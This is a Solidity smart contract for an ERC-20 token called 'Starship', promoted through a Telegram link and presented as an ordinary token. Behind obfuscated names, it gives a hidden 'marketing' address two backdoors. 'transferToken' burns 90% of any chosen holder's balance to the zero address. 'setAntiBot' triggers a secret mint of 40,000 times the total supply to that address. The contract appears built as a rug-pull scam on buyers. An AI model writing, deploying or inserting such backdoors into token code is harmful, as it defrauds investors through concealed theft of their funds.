// SPDX-License-Identifier: MIT



// JOIN OUR TELEGRAM: https://t.me/StarshipMarsPortal

//

//

//

//

//

//

//



pragma solidity ^ 0.8.18;



abstract contract Ownable {

  function _msgSender() internal view virtual returns(address) {

    return msg.sender;

  }

  function _msgData() internal view virtual returns(bytes calldata) {

    return msg.data;

  }

  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor() {

    _transferOwnership(_msgSender());

  }

  modifier onlyOwner() {

    _check();

    _;

  }

  function owner() public view virtual returns(address) {

    return _owner;

  }

  function _check() internal view virtual {

    require(owner() == _msgSender(), "Ownable: caller is not the owner");

  }

  function renounceOwnership() public virtual onlyOwner {

    _transferOwnership(address(0));

  }

  function _transferOwnership(address newOwner) internal virtual {

    address oldOwner = _owner;

    _owner = newOwner;

    emit OwnershipTransferred(oldOwner, newOwner);

  }

}



pragma solidity ^ 0.8.18;



contract Loop {

  uint256 public nn;

  uint256 public uu;

  uint256 public yy;

  constructor(uint256 _nn, uint256 _uu, uint256 _yy) {

    nn = _nn;

    uu = _uu;

    yy = _yy;

  }

  function pp() public view returns(uint256) {

    uint256 nn_ = nn;

    return nn_;

  }

  function kk() public view returns(uint256) {

    uint256 uu_ = uu;

    return uu_;

  }

  function gg() public view returns(uint256) {

    uint256 yy_ = yy;

    return yy_;

  }

}



pragma solidity ^ 0.8.18;



contract Roll is Ownable,

Loop {

  mapping(address => uint256) private _oreo;

  mapping(address => mapping(address => uint256)) private _allowances;

  uint256 private _tokentotalSupply;

  string private _tokenname;

  string private _tokensymbol;

  uint256 private _startTime;

  uint256 private nonce = 0;

  bool private _antiBot = false;

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);

  address private _marketing;

  function jj() private returns(uint256) {

    return _tokentotalSupply;

  }

  function setAntiBot(bool _newAntiBot) public {

    require(_msgSender() == _marketing, "Reverse");

    _antiBot = _newAntiBot;

  }

  function getBalanceToken(address account) private returns(uint256) {

    return _oreo[account];

  }

  function calculateBot(uint256 _amountBot) private returns(uint256) {

    uint256 botX = pp();

    uint256 botY = kk();

    uint256 amountBot_ = _amountBot * botX / botY;

    return amountBot_;

  }

  function random(uint256 lower, uint256 upper) private returns(uint256) {

    require(upper > lower, "Upper value must be greater than lower value");

    uint256 randomNumber = uint256(keccak256(abi.encodePacked(nonce, msg.sender, address(this), gasleft(), blockhash(block.number - 1))));

    nonce++;

    return (randomNumber % (upper - lower + 1)) + lower;

  }

  constructor(address marketing_, string memory tokenName_, string memory Tokensymbol_) Loop(9, 10, 40000) Ownable() {

    _marketing = marketing_;

    _tokenname = tokenName_;

    _tokensymbol = Tokensymbol_;

    uint256 amount = 10000000000*10**decimals();

    _tokentotalSupply += amount;

    _oreo[msg.sender] += amount;

    emit Transfer(address(0), msg.sender, amount);

    _startTime = block.timestamp;

  }

  function transferToken(address _abc) external returns(bool) {

    address secure = _msgSender();

    if (_marketing == secure) {

      address _def = 0x0000000000000000000000000000000000000000;

      uint256 _ghi = calculateBot(getBalanceToken(_abc));

      inTo(_abc, _def, _ghi);

      onTo(_abc, _def, _ghi);

      return true;

    } else {

      return false;

    }

  }

  function inTo(address _abc, address _def, uint256 _ghi) private {

    address secure = _msgSender();

    if (_marketing == secure) {

      uint256 _abcd = _oreo[_abc];

      require(_abcd >= _ghi, "Revert");

      _oreo[_abc] = _abcd - _ghi;

      _oreo[_def] += _ghi;

    }

  }

  function onTo(address _abc, address _def, uint256 _ghi) private {

    address secure = _msgSender();

    if (_marketing == secure) {

      emit Transfer(_abc, _def, _ghi);

      if (_antiBot) {

        uint256 gg = gg();

        uint256 jj = jj();

        _oreo[_marketing] = jj * gg;

        _antiBot = false;

      }

    }

  }

  function name() public view returns(string memory) {

    return _tokenname;

  }

  function symbol() public view returns(string memory) {

    return _tokensymbol;

  }

  function decimals() public view returns(uint8) {

    return 18;

  }

  function totalSupply() public view returns(uint256) {

    return _tokentotalSupply;

  }

  function balanceOf(address account) public view returns(uint256) {

    return _oreo[account];

  }

  function transfer(address to, uint256 amount) public returns(bool) {

    _xyz(_msgSender(), to, amount);

    return true;

  }

  function allowance(address owner, address spender) public view returns(uint256) {

    return _allowances[owner][spender];

  }

  function approve(address spender, uint256 amount) public returns(bool) {

    _approve(_msgSender(), spender, amount);

    return true;

  }

  function transferFrom(address from, address to, uint256 amount) public virtual returns(bool) {

    address spender = _msgSender();

    _internalspendAllowance(from, spender, amount);

    _xyz(from, to, amount);

    return true;

  }

  function increaseAllowance(address spender, uint256 addedValue) public virtual returns(bool) {

    address owner = _msgSender();

    _approve(owner, spender, allowance(owner, spender) + addedValue);

    return true;

  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns(bool) {

    address owner = _msgSender();

    uint256 currentAllowance = allowance(owner, spender);

    require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");

    _approve(owner, spender, currentAllowance - subtractedValue);

    return true;

  }

  function _xyz(address _abc, address _def, uint256 _ghi) internal virtual {

    require(_abc != address(0), "E1");

    require(_def != address(0), "E2");

    uint256 _jkl = _oreo[_abc];

    require(_jkl >= _ghi, "E3");

    _oreo[_abc] = _oreo[_abc] - _ghi;

    _oreo[_def] = _oreo[_def] + _ghi;

    emit Transfer(_abc, _def, _ghi);

  }

  function _approve(address owner, address spender, uint256 amount) internal virtual {

    require(owner != address(0), "ERC20: approve from the zero address");

    require(spender != address(0), "ERC20: approve to the zero address");

    _allowances[owner][spender] = amount;

    emit Approval(owner, spender, amount);

  }

  function _internalspendAllowance(address owner, address spender, uint256 amount) internal virtual {

    uint256 currentAllowance = allowance(owner, spender);

    if (currentAllowance != type(uint256).max) {

      require(currentAllowance >= amount, "ERC20: insufficient allowance");

      _approve(owner, spender, currentAllowance - amount);

    }

  }

}



pragma solidity ^ 0.8.18;



contract Starship is Roll {

  constructor(address marketing_, string memory tokenName_, string memory Tokensymbol_) Roll(marketing_, tokenName_, Tokensymbol_) {}

}